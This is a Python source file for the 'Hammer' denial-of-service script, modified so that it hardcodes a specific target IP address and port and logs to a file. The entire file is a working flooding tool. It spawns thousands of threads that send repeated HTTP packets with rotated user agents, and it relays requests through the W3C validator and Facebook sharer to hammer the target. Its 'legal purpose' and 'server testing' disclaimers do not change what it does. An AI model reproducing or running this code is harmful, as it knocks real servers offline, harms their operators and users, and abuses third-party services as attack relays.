#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

import os


def custom_log(log_statement, log_file_path="logs.txt"):
    # Check if the log file exists
    if not os.path.exists(log_file_path):
        with open(log_file_path, "w") as f:
            f.write(log_statement + "\n")
    else:
        # Open the file in append mode
        with open(log_file_path, "a+") as f:
            # Write the log statement to the file
            f.write(log_statement + "\n")
            # Check if the file contains more than 1000 lines
            f.seek(0)
            line_count = len(f.readlines())
            if line_count >= 1000:
                # Clear the file and write the log statement to the cleared file
                f.truncate(0)
                f.write(log_statement + "\n")


def user_agent():
    global uagent
    uagent = []
    uagent.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append(
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"
    )
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    )
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    )
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    )
    return (uagent)


def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return (bots)


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(
                urllib.request.Request(url,
                                       headers={'User-Agent': random.choice(uagent)}))
            print("\033[94mbot is hammering...\033[0m")
            custom_log("bot is hammering...")
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " +
                         random.choice(uagent) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()),
                      "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
                custom_log("packet sent! hammering...")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
                custom_log("shut<->down")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        custom_log("no connection! server maybe down")
        # print("\033[91m",e,"\033[0m")
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()


def usage():
    print(''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammer.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 2000 \033[0m''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item

    host = '139.99.91.118'
    port = 80
    thr = 2000


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
# task queue are q,w
q = Queue()
w = Queue()


def start():
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr),
          "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    custom_log("Please wait...")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server ip and port\033[0m")
        custom_log("check server ip and port")
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if (item > 1800):  # for no memory crash
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()


if __name__ == "__main__":
    start()
